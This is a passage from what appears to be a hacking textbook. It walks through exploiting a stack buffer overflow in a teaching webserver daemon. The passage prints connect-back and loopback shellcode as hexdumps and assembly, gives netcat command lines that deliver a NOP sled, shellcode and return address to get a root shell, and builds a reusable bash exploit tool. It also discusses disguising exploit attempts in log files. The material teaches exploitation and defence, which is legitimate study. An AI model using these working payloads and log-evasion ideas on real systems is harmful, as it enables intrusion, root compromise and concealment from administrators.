192.168.42.72 so the shellcode can connect back to it.\nreader@hacking:~/booksrc $ sudo ifconfig eth0 192.168.42.72 up\neth0      Link encap:Ethernet  HWaddr 00:01:6C:EB:1D:50\ninet addr:192.168.42.72  Bcast:192.168.42.255  Mask:255.255.255.0\nTX packets:0 errors:0 dropped:0 overruns:0 carrier:0\nNow, let\u2019s try to exploit the tinyweb server program using the connect-\nback shellcode. From working with this program before, we know that the\nrequest buffer is 500 bytes long and is located at 0xbffff5c0 in stack memory.\nWe also know that the return address is found within 40 bytes of the end of\nreader@hacking:~/booksrc $ nasm connectback_shell.s\nreader@hacking:~/booksrc $ hexdump -C connectback_shell\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  96 6a 66 58 43 68 c0 a8  2a 48 66 68 7a 69 66 53  |.jfXCh..*HfhzifS|\n00000020  89 e1 6a 10 51 56 89 e1  43 cd 80 87 f3 87 ce 49  |..j.QV..C......I|\n00000030  b0 3f cd 80 49 79 f9 b0  0b 52 68 2f 2f 73 68 68  |.?..Iy...Rh//shh|\n00000040  2f 62 69 6e 89 e3 52 89  e2 53 89 e1 cd 80        |/bin..R..S....|\nreader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 78 ))\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p /x 0xbffff5c0 + 200\"\nSince the offset from the beginning of the buffer to the return address is\n540 bytes, a total of 544 bytes must be written to overwrite the four-byte return\naddress. The return address overwrite also needs to be properly aligned, since\nthe return address uses multiple bytes. To ensure proper alignment, the sum\nof the NOP sled and shellcode bytes must be divisible by four. In addition, the\nshellcode itself must stay within the first 500 bytes of the overwrite. These are\nthe bounds of the response buffer, and the memory afterward corresponds\nto other values on the stack that might be written to before we change the\nprogram\u2019s control flow. Staying within these bounds avoids the risk of random\noverwrites to the shellcode, which inevitably lead to crashes. Repeating the\nreturn address 16 times will generate 64 bytes, which can be put at the end of\nthe 544-byte exploit buffer and keeps the shellcode safely within the bounds\nof the buffer. The remaining bytes at the beginning of the exploit buffer will\nbe the NOP sled. The calculations above show that a 402-byte NOP sled will\nproperly align the 78-byte shellcode and place it safely within the bounds of\nthe buffer. Repeating the desired return address 12 times spaces the final\n4 bytes of the exploit buffer perfectly to overwrite the saved return address\non the stack. Overwriting the return address with 0xbffff688 should return\nexecution right to the middle of the NOP sled, while avoiding bytes near the\nbeginning of the buffer, which might get mangled. These calculated values\nwill be used in the following exploit, but first the connect-back shell needs\nsome place to connect back to.  In the output below, netcat is used to listen\nNow, in another terminal, the calculated exploit values can be used to\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x402';\n> perl -e 'print \"\\x88\\xf6\\xff\\xbf\"x20 . \"\\r\\n\"') | nc -v 127.0.0.1 80\nBack in the original terminal, the shellcode has connected back to\nthe netcat process listening on port 31337.  This provides root shell access\nconnect to [192.168.42.72] from hacking.local [192.168.42.72] 34391\nThe network configuration for this example is slightly confusing\nbecause the attack is directed at 127.0.0.1 and the shellcode connects back\nto 192.168.42.72. Both of these IP addresses route to the same place, but\n192.168.42.72 is easier to use in shellcode than 127.0.0.1. Since the loopback\naddress contains two null bytes, the address must be built on the stack with\nmultiple instructions. One way to do this is to write the two null bytes to\nthe stack using a zeroed register. The file loopback_shell.s is a modified\nversion of connectback_shell.s that uses the loopback address of 127.0.0.1.\nreader@hacking:~/booksrc $ diff connectback_shell.s loopback_shell.s\n<   push DWORD 0x482aa8c0 ; Build sockaddr struct: IP Address = 192.168.42.72\n>   push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1\n>   mov WORD [esp+1], dx  ; overwrite the BBBB with 0000 in the previous push\nAfter pushing the value 0x01BBBB7f to the stack, the ESP register will point\nto the beginning of this DWORD. By writing a two-byte WORD of null bytes\nat ESP+1, the middle two bytes will be overwritten to form the correct return\nThis additional instruction increases the size of the shellcode by a few\nbytes, which means the NOP sled also needs to be adjusted for the exploit\nbuffer. These calculations are shown in the output below, and they result in\na 397-byte NOP sled. This exploit using the loopback shellcode assumes that\nthe tinyweb program is running and that a netcat process is listening for\nreader@hacking:~/booksrc $ hexdump -C loopback_shell | grep --color=auto 00\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  96 6a 66 58 43 68 7f bb  bb 01 66 89 54 24 01 66  |.jfXCh....f.T$.f|\n00000020  68 7a 69 66 53 89 e1 6a  10 51 56 89 e1 43 cd 80  |hzifS..j.QV..C..|\n00000030  87 f3 87 ce 49 b0 3f cd  80 49 79 f9 b0 0b 52 68  |....I.?..Iy...Rh|\n00000040  2f 2f 73 68 68 2f 62 69  6e 89 e3 52 89 e2 53 89  |//shh/bin..R..S.|\n00000050  e1 cd 80                                          |...|\nreader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 83 ))\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x397';cat loopback_shell;perl -e 'print \"\\x88\\\nAs with the previous exploit, the terminal with netcat listening on\nconnect to [127.0.0.1] from localhost [127.0.0.1] 42406\nadult humans. The only reason these frogs have such\nan amazingly powerful defense is that a certain species\nof snake kept eating them and developing a resistance.\nIn response, the frogs kept evolving stronger and stronger poisons as a\ndefense. One result of this co-evolution is that the frogs are safe against all\nother predators. This type of co-evolution also happens with hackers. Their\nexploit techniques have been around for years, so it\u2019s only natural that\ndefensive countermeasures would develop. In response, hackers find ways\nto bypass and subvert these defenses, and then new defense techniques are\nThis cycle of innovation is actually quite beneficial. Even though viruses\nand worms can cause quite a bit of trouble and costly interruptions for busi-\nnesses, they force a response, which fixes the problem. Worms replicate by\nexploiting existing vulnerabilities in flawed software. Often these flaws are\nundiscovered for years, but relatively benign worms such as CodeRed or Sasser\nforce these problems to be fixed. As with chickenpox, it\u2019s better to suffer a\nminor outbreak early instead of years later when it can cause real damage.\nIf it weren\u2019t for Internet worms making a public spectacle of these security\nflaws, they might remain unpatched, leaving us vulnerable to an attack from\nsomeone with more malicious goals than just replication. In this way, worms\nand viruses can actually strengthen security in the long run. However, there\nare more proactive ways to strengthen security. Defensive countermeasures\nexist which try to nullify the effect of an attack, or prevent the attack from\nhappening. A countermeasure is a fairly abstract concept; this could be a\nsecurity product, a set of policies, a program, or simply just an attentive system\nadministrator. These defensive countermeasures can be separated into two\ngroups: those that try to detect the attack and those that try to protect the\nThe first group of countermeasures tries to detect the intrusion and respond\nin some way. The detection process could be anything from an administrator\nreading logs to a program sniffing the network. The response might include\nkilling the connection or process automatically, or just the administrator\nscrutinizing everything from the machine\u2019s console.\nAs a system administrator, the exploits you know about aren\u2019t nearly as\ndangerous as the ones you don\u2019t. The sooner an intrusion is detected, the\nsooner it can be dealt with and the more likely it can be contained. Intrusions\nthat aren\u2019t discovered for months can be cause for concern.\nThe way to detect an intrusion is to anticipate what the attacking hacker\nis going to do. If you know that, then you know what to look for. Counter-\nmeasures that detect can look for these attack patterns in log files, network\npackets, or even program memory. After an intrusion is detected, the hacker\ncan be expunged from the system, any filesystem damage can be undone by\nrestoring from backup, and the exploited vulnerability can be identified and\npatched. Detecting countermeasures are quite powerful in an electronic\nFor the attacker, this means detection can counteract everything he does.\nSince the detection might not always be immediate, there are a few \u201csmash\nand grab\u201d scenarios where it doesn\u2019t matter; however, even then it\u2019s better\nnot to leave tracks. Stealth is one of the hacker\u2019s most valuable assets. Exploit-\ning a vulnerable program to get a root shell means you can do whatever you\nwant on that system, but avoiding detection additionally means no one knows\nyou\u2019re there. The combination of \u201cGod mode\u201d and invisibility makes for a\ndangerous hacker. From a concealed position, passwords and data can be\nquietly sniffed from the network, programs can be backdoored, and further\nattacks can be launched on other hosts. To stay hidden, you simply need to\nanticipate the detection methods that might be used. If you know what they\nare looking for, you can avoid certain exploit patterns or mimic valid ones.\nThe co-evolutionary cycle between hiding and detecting is fueled by thinking\nTo have a realistic discussion of exploit countermeasures and bypass methods,\nwe first need a realistic exploitation target. A remote target will be a server\nprogram that accepts incoming connections. In Unix, these programs are\nusually system daemons. A daemon is a program that runs in the back-\nground and detaches from the controlling terminal in a certain way. The\nterm daemon was first coined by MIT hackers in the 1960s. It refers to a\nmolecule-sorting demon from an 1867 thought experiment by a physicist\nnamed James Maxwell. In the thought experiment, Maxwell\u2019s demon is a\nbeing with the supernatural ability to effortlessly perform difficult tasks,\napparently violating the second law of thermodynamics. Similarly, in Linux,\nsystem daemons tirelessly perform tasks such as providing SSH service and\nkeeping system logs. Daemon programs typically end with a d to signify they\nWith a few additions, the tinyweb.c code on page 214 can be made into a\nmore realistic system daemon. This new code uses a call to the daemon() func-\ntion, which will spawn a new background process. This function is used by\nmany system daemon processes in Linux, and its man page is shown below.\nDAEMON(3)                  Linux Programmer's Manual                 DAEMON(3)\nThe daemon() function is for programs wishing to detach themselves from\nthe controlling terminal and run in the background as system daemons.\nUnless the argument nochdir is non-zero, daemon() changes  the  current\nUnless  the  argument noclose is non-zero, daemon() will redirect stan\ndard input, standard output and standard error to /dev/null.\n(This function forks, and if  the  fork()  succeeds,  the  parent  does\n_exit(0),  so that further errors are seen by the child only.)  On suc\ncess zero will be returned.  If an error occurs,  daemon()  returns  -1\nand  sets  the global variable errno to any of the errors specified for\nSystem daemons run detached from a controlling terminal, so the new\ntinyweb daemon code writes to a log file. Without a controlling terminal,\nsystem daemons are typically controlled with signals. The new tinyweb\ndaemon program will need to catch the terminate signal so it can exit\nSignals provide a method of interprocess communication in Unix. When a\nprocess receives a signal, its flow of execution is interrupted by the operating\nsystem to call a signal handler. Signals are identified by a number, and each\none has a default signal handler. For example, when CTRL-C is typed in a\nprogram\u2019s controlling terminal, an interrupt signal is sent, which has a default\nsignal handler that exits the program. This allows the program to be inter-\nCustom signal handlers can be registered using the signal() function.\nIn the example code below, several signal handlers are registered for certain\nsignals, whereas the main code contains an infinite loop.\n* #define SIGPIPE      13 Write to pipe with no one reading\n* #define SIGALRM      14 Countdown alarm set by alarm()\n* #define SIGTERM      15 Termination (sent by kill command)\n* #define SIGTSTP      20 Terminal stop [suspend] (Ctrl-Z)\n* #define SIGTTIN      21 Background process trying to read stdin\n* #define SIGTTOU      22 Background process trying to read stdout\nprintf(\"Caught a Ctrl-C (SIGINT) in a separate handler\\nExiting.\\n\");\nsignal(SIGQUIT, signal_handler); // Set signal_handler() as the\nsignal(SIGTSTP, signal_handler); // signal handler for these\nsignal(SIGINT, sigint_handler);  // Set sigint_handler() for SIGINT.\nWhen this program is compiled and executed, signal handlers are\nregistered, and the program enters an infinite loop. Even though the program\nis stuck looping, incoming signals will interrupt execution and call the\nregistered signal handlers. In the output below, signals that can be triggered\nfrom the controlling terminal are used. The signal_handler() function,\nwhen finished, returns execution back into the interrupted loop, whereas\nreader@hacking:~/booksrc $ gcc -o signal_example signal_example.c\nSpecific signals can be sent to a process using the kill command. By\ndefault, the kill command sends the terminate signal (SIGTERM) to a process.\nWith the -l command-line switch, kill lists all the possible signals. In the\noutput below, the SIGUSR1 and SIGUSR2 signals are sent to the signal_example\n1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL\n5) SIGTRAP      6) SIGABRT      7) SIGBUS       8) SIGFPE\n9) SIGKILL     10) SIGUSR1     11) SIGSEGV     12) SIGUSR2\n13) SIGPIPE     14) SIGALRM     15) SIGTERM     16) SIGSTKFLT\n17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP\n21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU\n25) SIGXFSZ     26) SIGVTALRM   27) SIGPROF     28) SIGWINCH\n29) SIGIO       30) SIGPWR      31) SIGSYS      34) SIGRTMIN\n35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3  38) SIGRTMIN+4\n39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8\n43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12\n47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14\n51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10\n55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7  58) SIGRTMAX-6\n59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2\nreader@hacking:~/booksrc $ ps a | grep signal_example\nFinally, the SIGKILL signal is sent using kill -9. This signal\u2019s handler\ncannot be changed, so kill -9 can always be used to kill processes. In the\nother terminal, the running signal_example shows the signals as they are\nSignals themselves are pretty simple; however, interprocess communica-\ntion can quickly become a complex web of dependencies. Fortunately, in the\nnew tinyweb daemon, signals are only used for clean termination, so the\nThis newer version of the tinyweb program is a system daemon that runs in\nthe background without a controlling terminal. It writes its output to a log\nfile with timestamps, and it listens for the terminate (SIGTERM) signal so it\nThese additions are fairly minor, but they provide a much more realistic\nexploit target. The new portions of the code are shown in bold in the listing\n#define PORT 80   // The port users will be connecting to\n#define WEBROOT \"./webroot\" // The webserver's root directory\n#define LOGFILE \"/var/log/tinywebd.log\" // Log filename\nint logfd, sockfd;  // Global log and socket file descriptors\nvoid handle_connection(int, struct sockaddr_in *, int);\nint get_file_size(int); // Returns the file size of open file descriptor\nvoid timestamp(int); // Writes a timestamp to the open file descriptor\n// This function is called when the process is killed.\nstruct sockaddr_in host_addr, client_addr;   // My address information\nlogfd = open(LOGFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\nif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\nif(daemon(1, 0) == -1) // Fork to a background daemon process.\nsignal(SIGTERM, handle_shutdown);   // Call handle_shutdown when killed.\nsignal(SIGINT, handle_shutdown);   // Call handle_shutdown when interrupted.\nhost_addr.sin_family = AF_INET;      // Host byte order\nhost_addr.sin_port = htons(PORT);    // Short, network byte order\nhost_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\nmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\nhandle_connection(new_sockfd, &client_addr, logfd);\n/* This function handles the connection on the passed socket from the\n* passed client address and logs to the passed FD. The connection is\n* processed as a web request and this function replies over the connected\n* socket. Finally, the passed socket is closed at the end of the function.\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\nunsigned char *ptr, request[500], resource[500], log_buffer[500];\nsprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(client_addr_ptr->sin_addr),\nptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\n*ptr = 0; // Terminate the buffer at the end of the URL.\nptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\nif(strncmp(request, \"GET \", 4) == 0)  // Get request\nif(strncmp(request, \"HEAD \", 5) == 0) // Head request\nif(ptr == NULL) { // Then this is not a recognized request\n} else { // Valid request, with ptr pointing to the resource name\nif (ptr[strlen(ptr) - 1] == '/')  // For resources ending with '/',\nstrcat(ptr, \"index.html\");     // add 'index.html' to the end.\nstrcpy(resource, WEBROOT);     // Begin resource with web root path\nstrcat(resource, ptr);         //  and join it with resource path.\nfd = open(resource, O_RDONLY, 0); // Try to open the file.\nsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\nsend_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\nsend_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\nsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\nif(ptr == request + 4) { // Then this is a GET request\nif( (ptr = (unsigned char *) malloc(length)) == NULL)\nread(fd, ptr, length); // Read the file into memory.\nsend(sockfd, ptr, length, 0);  // Send it to socket.\nwrite(logfd, log_buffer, length); // Write to the log.\nshutdown(sockfd, SHUT_RDWR); // Close the socket gracefully.\n/* This function accepts an open file descriptor and returns\n* the size of the associated file. Returns -1 on failure.\n/* This function writes a timestamp string to the open file descriptor\ntime_struct = localtime((const time_t *)&now); // Convert to tm struct.\nlength = strftime(time_buffer, 40, \"%m/%d/%Y %H:%M:%S> \", time_struct);\nwrite(fd, time_buffer, length); // Write timestamp string to log.\nThis daemon program forks into the background, writes to a log file with\ntimestamps, and cleanly exits when it is killed. The log file descriptor and\nconnection-receiving socket are declared as globals so they can be closed\ncleanly by the handle_shutdown() function. This function is set up as the callback\nhandler for the terminate and interrupt signals, which allows the program to\nexit gracefully when it\u2019s killed with the kill command.\nThe output below shows the program compiled, executed, and killed.\nNotice that the log file contains timestamps as well as the shutdown message\nwhen the program catches the terminate signal and calls handle_shutdown()\nreader@hacking:~/booksrc $ gcc -o tinywebd tinywebd.c\nreader@hacking:~/booksrc $ sudo chown root ./tinywebd\nreader@hacking:~/booksrc $ sudo chmod u+s ./tinywebd\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nreader@hacking:~/booksrc $ cat /var/log/tinywebd.log\nreader@hacking:~/booksrc $ sudo cat /var/log/tinywebd.log\n07/22/2007 17:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\"      200 OK\nThis tinywebd program serves HTTP content just like the original tinyweb\nprogram, but it behaves as a system daemon, detaching from the controlling\nterminal and writing to a log file. Both programs are vulnerable to the same\noverflow exploit; however, the exploitation is only the beginning. Using the\nnew tinyweb daemon as a more realistic exploit target, you will learn how to\nWith a realistic target in place, let\u2019s jump back over to the attacker\u2019s side of\nthe fence. For this kind of attack, exploit scripts are an essential tool of the\ntrade. Like a set of lock picks in the hands of a professional, exploits open\nmany doors for a hacker. Through careful manipulation of the internal\nmechanisms, the security can be entirely sidestepped.\nIn previous chapters, we\u2019ve written exploit code in C and manually\nexploited vulnerabilities from the command line. The fine line between\nan exploit program and an exploit tool is a matter of finalization and recon-\nfigurability. Exploit programs are more like guns than tools. Like a gun, an\nexploit program has a singular utility and the user interface is as simple as\npulling a trigger. Both guns and exploit programs are finalized products that\ncan be used by unskilled people with dangerous results. In contrast, exploit\ntools usually aren\u2019t finished products, nor are they meant for others to use.\nWith an understanding of programming, it\u2019s only natural that a hacker would\nbegin to write his own scripts and tools to aid exploitation. These personalized\ntools automate tedious tasks and facilitate experimentation. Like conventional\ntools, they can be used for many purposes, extending the skill of the user.\nFor the tinyweb daemon, we want an exploit tool that allows us to experiment\nwith the vulnerabilities. As in the development of our previous exploits,\nGDB is used first to figure out the details of the vulnerability, such as offsets.\nThe offset to the return address will be the same as in the original tinyweb.c\nprogram, but a daemon program presents added challenges. The daemon\ncall forks the process, running the rest of the program in the child process,\nwhile the parent process exits. In the output below, a breakpoint is set after\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n43         if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\n44            fatal(\"setting socket option SO_REUSEADDR\");\n47         if(daemon(1, 1) == -1) // Fork to a background daemon process.\n50         signal(SIGTERM, handle_shutdown);   // Call handle_shutdown when killed.\n51         signal(SIGINT, handle_shutdown);   // Call handle_shutdown when interrupted.\nBreakpoint 1 at 0x8048e84: file tinywebd.c, line 50.\nWhen the program is run, it just exits. In order to debug this program,\nGDB needs to be told to follow the child process, as opposed to following the\nparent. This is done by setting follow-fork-mode to child. After this change, the\ndebugger will follow execution into the child process, where the breakpoint\nSet debugger response to a program call of fork or vfork.\nA fork or vfork creates a new process.  follow-fork-mode can be:\nparent  - the original process is debugged after a fork\nBy default, the debugger will follow the parent process.\n50         signal(SIGTERM, handle_shutdown);   // Call handle_shutdown when killed.\nroot       911  0.0  0.0   1636   416 ?        Ss   06:04   0:00 /home/reader/booksrc/a.out\nreader    1207  0.0  0.0   2880   748 pts/2    R+   06:13   0:00 grep a.out\nIt\u2019s good to know how to debug child processes, but since we need\nspecific stack values, it\u2019s much cleaner and easier to attach to a running\nprocess. After killing any stray a.out processes, the tinyweb daemon is\nroot     25830  0.0  0.0   1636   356 ?        Ss   20:10   0:00 ./tinywebd\nreader   25837  0.0  0.0   2880   748 pts/1    R+   20:10   0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo gdb -q\u2014pid=25830 --symbols=./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already.  Kill it? (y or n) n\n67            sin_size = sizeof(struct sockaddr_in);\n68            new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n72            handle_connection(new_sockfd, &client_addr, logfd);\n77      /* This function handles the connection on the passed socket from the\n78       * passed client address and logs to the passed FD. The connection is\n79       * processed as a web request, and this function replies over the connected\n80       * socket. Finally, the passed socket is closed at the end of the function.\n82      void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\n83         unsigned char *ptr, request[500], resource[500], log_buffer[500];\nBreakpoint 1 at 0x8048fc3: file tinywebd.c, line 86.\nThe execution pauses while the tinyweb daemon waits for a connection.\nOnce again, a connection is made to the webserver using a browser to advance\nBreakpoint 1, handle_connection (sockfd=5, client_addr_ptr=0xbffff810) at tinywebd.c:86\n#0  handle_connection (sockfd=5, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\n0xbffff7b4:     0xb7fd5ff4      0xb8000ce0      0x00000000      0xbffff848\n0xbffff7c4:     0xb7ff9300      0xb7fd5ff4      0xbffff7e0      0xb7f691c0\n0xbffff7d4:     0xb7fd5ff4      0xbffff848      0x08048fb7      0x00000005\n0xbffff7e4:     0xbffff810      0x00000003      0xbffff838      0x00000004\nThe program is running. Quit anyway (and detach it)? (y or n) y\nThe debugger shows that the request buffer starts at 0xbffff5c0 and the\nstored return address is at 0xbffff7dc, which means the offset is 540 bytes.\nThe safest place for the shellcode is near the middle of the 500-byte request\nbuffer. In the output below, an exploit buffer is created that sandwiches the\nshellcode between a NOP sled and the return address repeated 32 times. The\n128 bytes of repeated return address keep the shellcode out of unsafe stack\nmemory, which might be overwritten. There are also unsafe bytes near the\nbeginning of the exploit buffer, which will be overwritten during null termina-\ntion. To keep the shellcode out of this range, a 100-byte NOP sled is put in\nfront of it. This leaves a safe landing zone for the execution pointer, with the\nshellcode at 0xbffff624. The following output exploits the vulnerability using\nreader@hacking:~/booksrc $ echo $((540+4 - (32*4) - 83))\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x333'; cat loopback_shell; perl -e 'print \"\\\nx24\\xf6\\xff\\xbf\"x32 . \"\\r\\n\"') | nc -w 1 -v 127.0.0.1 80\nSince the offset to the return address is 540 bytes, 544 bytes are needed\nto overwrite the address. With the loopback shellcode at 83 bytes and the\noverwritten return address repeated 32 times, simple arithmetic shows that\nthe NOP sled needs to be 333 bytes to align everything in the exploit buffer\nproperly. netcat is run in listen mode with an ampersand (&) appended to\nthe end, which sends the process to the background. This listens for the con-\nnection back from the shellcode and can be resumed later with the command\nfg (foreground). On the LiveCD, the at (@) symbol in the command prompt\nwill change color if there are background jobs, which can also be listed with\nthe jobs command. When the exploit buffer is piped into netcat, the -w option\nis used to tell it to time out after one second. Afterward, the backgrounded\nnetcat process that received the connectback shell can be resumed.\nAll this works fine, but if a shellcode of different size is used, the NOP\nsled size must be recalculated. All these repetitive steps can be put into a\nThe BASH shell allows for simple control structures. The if statement at\nthe beginning of this script is just for error checking and displaying the usage\nmessage. Shell variables are used for the offset and overwrite return address,\nso they can be easily changed for a different target. The shellcode used for\nthe exploit is passed as a command-line argument, which makes this a useful\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\necho \"[NOP ($ALIGNED_SLED_SIZE bytes)] [shellcode ($SIZE bytes)] [ret addr\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"\\r\\n\\\"\";) | nc -w 1 -v $2 80\nNotice that this script repeats the return address an additional thirty-third\ntime, but it uses 128 bytes (32 \u00d7 4) for calculating the sled size. This puts an\nextra copy of the return address past where the offset dictates. Sometimes\ndifferent compiler options will move the return address around a little bit,\nso this makes the exploit more reliable. The output below shows this tool being\nused to exploit the tinyweb daemon once again, but with the port-binding\nreader@hacking:~/booksrc $ ./xtool_tinywebd.sh portbinding_shellcode 127.0.0.1\n[NOP (324 bytes)] [shellcode (92 bytes)] [ret addr (128 bytes)]\nNow that the attacking side is armed with an exploit script, consider what\nhappens when it\u2019s used. If you were the administrator of the server running\nthe tinyweb daemon, what would be the first signs that you were hacked?\nOne of the two most obvious signs of intrusion is the log file. The log file kept\nby the tinyweb daemon is one of the first places to look into when trouble-\nshooting a problem. Even though the attacker\u2019s exploits were successful,\nthe log file keeps a painfully obvious record that something is up.\nreader@hacking:~/booksrc $ sudo cat /var/log/tinywebd.log\n07/25/2007 14:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\"      200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50201 \"GET / HTTP/1.1\"       200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50202 \"GET /image.jpg HTTP/1.1\"      200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50203 \"GET /favicon.ico HTTP/1.1\"    404 Not Found\n08/01/2007 15:43:41> From 127.0.0.1:45396 \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000jfX\u00001\u0000CRj j \u0000\u0000 \u0000jfXCh \u0000\u0000\nf\u0000T$ fhzifS\u0000\u0000j QV\u0000\u0000C \u0000\u0000\u0000\u0000I\u0000? Iy\u0000\u0000Rh//shh/bin\u0000\u0000R\u0000\u0000S\u0000\u0000 $\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000$\u0000\u0000\u0000\"  NOT HTTP!\nOf course in this case, after the attacker gains a root shell, he can just edit\nthe log file since it\u2019s on the same system. On secure networks, however, copies\nof logs are often sent to another secure server. In extreme cases, logs are sent\nto a printer for hard copy, so there is a physical record. These types of counter-\nmeasures prevent tampering with the logs after successful exploitation.\nEven though the log files themselves cannot be changed, occasionally what\ngets logged can be. Log files usually contain many valid entries, whereas\nexploit attempts stick out like a sore thumb. The tinyweb daemon program\ncan be tricked into logging a valid-looking entry for an exploit attempt.\nLook at the source code and see if you can figure out how to do this before\ncontinuing on. The idea is to make the log entry look like a valid web request,\n07/22/2007 17:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\"   200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50201 \"GET / HTTP/1.1\"    200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50202 \"GET /image.jpg HTTP/1.1\"   200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50203 \"GET /favicon.ico HTTP/1.1\"    404 Not Found\nThis type of camouflage is very effective at large enterprises with extensive\nlog files, since there are so many valid requests to hide among: It\u2019s easier to\nblend in at a crowded mall than an empty street. But how exactly do you hide\na big, ugly exploit buffer in the proverbial sheep\u2019s clothing?\nThere\u2019s a simple mistake in the tinyweb daemon\u2019s source code that allows\nthe request buffer to be truncated early when it\u2019s used 